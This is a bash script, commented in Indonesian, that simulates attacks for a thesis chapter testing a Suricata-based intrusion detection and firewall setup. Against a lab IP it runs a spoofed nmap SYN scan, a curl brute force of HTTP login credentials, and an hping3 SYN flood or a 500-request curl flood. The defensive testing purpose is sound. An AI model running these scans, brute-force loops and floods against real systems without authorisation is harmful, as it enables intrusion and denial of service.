#!/usr/bin/env bash
# =============================================================================
#  attack_bab5.sh — Simulasi Serangan untuk Skripsi BAB V (SuricataEVE)
#  Skenario menggunakan 3 IP Virtual berbeda:
#  1. Port Scanning (IP 1)
#  2. Brute Force (IP 2)
#  3. DDoS Simulation (IP 3)
# =============================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BOLD='\033[1m'
NC='\033[0m'

# --- KONFIGURASI TARGET ---
TARGET_IP="192.168.216.128" # GANTI DENGAN IP TARGET ANDA
TARGET_PORT="80"
TARGET_URL="http://${TARGET_IP}:${TARGET_PORT}/login"

info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
attack()  { echo -e "${RED}[ATK]${NC}   $*"; }
header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════${NC}";
            echo -e "${BOLD}${BLUE}  $*${NC}";
            echo -e "${BOLD}${BLUE}══════════════════════════════════════════${NC}\n"; }

# ── SETUP VIRTUAL IPs ────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && warn "Gunakan sudo untuk membuat IP Virtual! (sudo ./attack_bab5.sh)" && exit 1

IFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
[[ -z "$IFACE" ]] && IFACE="eth0"
KALI_IP=$(ip -o -4 addr show dev "$IFACE" | awk '{print $4}' | cut -d/ -f1)
IP_BASE=$(echo "$KALI_IP" | cut -d. -f1,2,3)
[[ -z "$IP_BASE" ]] && IP_BASE="192.168.1"

# 3 IP Virtual Khusus Serangan
IP_1="${IP_BASE}.201"
IP_2="${IP_BASE}.202"
IP_3="${IP_BASE}.203"

cleanup() {
    echo ""
    warn "Membersihkan IP virtual dari interface ${IFACE}..."
    ip addr del "${IP_1}/24" dev "$IFACE" 2>/dev/null
    ip addr del "${IP_2}/24" dev "$IFACE" 2>/dev/null
    ip addr del "${IP_3}/24" dev "$IFACE" 2>/dev/null
    info "Semua IP virtual berhasil dihapus."
}
trap cleanup EXIT

header "🔥 SURICATAEVE ATTACK SIMULATOR (3 IP BERBEDA)"
echo -e "  Target IP : ${BOLD}${TARGET_IP}${NC}"
echo -e "  Interface : ${BOLD}${IFACE}${NC}"
echo -e "  IP Nmap   : ${BOLD}${IP_1}${NC}"
echo -e "  IP Brute  : ${BOLD}${IP_2}${NC}"
echo -e "  IP DDoS   : ${BOLD}${IP_3}${NC}"
echo ""

read -rp "$(echo -e ${YELLOW}[?]${NC}) Lanjut eksekusi dan buat IP Virtual? (y/N): " confirm
[[ "${confirm,,}" != "y" ]] && echo "Dibatalkan." && exit 0

info "Membuat IP Virtual..."
ip addr add "${IP_1}/24" dev "$IFACE" 2>/dev/null
ip addr add "${IP_2}/24" dev "$IFACE" 2>/dev/null
ip addr add "${IP_3}/24" dev "$IFACE" 2>/dev/null
sleep 2

# ── 1. PORT SCANNING (IP_1) ───────────────────────────────────────────────────
header "1. Skenario Pengujian: Port Scanning (${IP_1})"
attack "Melakukan pemindaian port menggunakan Nmap dari IP ${IP_1}..."
if command -v nmap &> /dev/null; then
    nmap -sS -p 1-1000 -T4 -S "${IP_1}" -e "${IFACE}" "${TARGET_IP}"
else
    warn "Nmap tidak ditemukan, menggunakan curl fallback..."
    curl --interface "${IP_1}" -s "http://${TARGET_IP}:80" > /dev/null
fi
info "Port Scanning Selesai. (Silakan screenshot untuk BAB V)"
sleep 3

# ── 2. BRUTE FORCE (IP_2) ─────────────────────────────────────────────────────
header "2. Skenario Pengujian: Brute Force (${IP_2})"
attack "Melakukan simulasi Brute Force Login menggunakan Curl dari IP ${IP_2}..."
# Menggunakan curl untuk brute force HTTP karena hydra susah set source IP secara spesifik tanpa config rumit
for i in {1..20}; do
    # Jika curl gagal/timeout karena iptables DROP, langsung stop loop
    if ! curl --connect-timeout 1 -m 1 --interface "${IP_2}" -s -u "admin:salahpass$i" "$TARGET_URL" > /dev/null 2>&1; then
        echo -e "\n${GREEN}[OK]${NC} Koneksi terputus! IP ${IP_2} telah berhasil diblokir oleh Firewall."
        break
    fi
    echo -ne "Mencoba password: salahpass$i dari ${IP_2}\r"
    sleep 0.2
done
echo ""
info "Brute Force Selesai. (Silakan screenshot untuk BAB V)"
sleep 3

# ── 3. DDoS SIMULATION (IP_3) ─────────────────────────────────────────────────
header "3. Skenario Pengujian: DDoS Simulation (${IP_3})"
attack "Melakukan simulasi DDoS (SYN Flood) dari IP ${IP_3}..."
if command -v hping3 &> /dev/null; then
    attack "Menggunakan Hping3 (Spoofing ke ${IP_3})..."
    hping3 -a "${IP_3}" -S -p 80 --flood -c 10000 "${TARGET_IP}"
else
    attack "Menggunakan Curl HTTP Flood dari ${IP_3} (Background jobs)..."
    for i in {1..500}; do
        curl --interface "${IP_3}" -s "$TARGET_URL" > /dev/null 2>&1 &
    done
    wait
    echo "500 Request dikirim secara bersamaan."
fi
info "DDoS Simulation Selesai. (Silakan screenshot untuk BAB V)"
echo ""

header "✅ SEMUA SKENARIO PENGUJIAN SELESAI"
echo -e "Silakan cek Dashboard SuricataEVE dan Log Firewall untuk melihat hasil deteksi."
echo -e "Akan terlihat 3 IP terblokir: ${IP_1}, ${IP_2}, dan ${IP_3}."
